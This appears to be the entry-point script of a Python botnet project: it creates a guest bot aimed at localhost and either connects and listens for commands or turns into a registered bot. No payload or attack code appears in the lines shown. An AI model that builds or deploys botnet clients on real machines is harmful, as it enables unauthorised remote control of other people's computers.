from botnet.module_manager import ModuleManager
from botnet.bot.bot import GuestBot

def main():
    bot = GuestBot("localhost")

    client_id = bot.getID()

    if client_id == None:
        bot.connect()
        bot.listen()
    else:
        bot.toRegisteredBot(client_id)


if __name__ == "__main__":
    main()
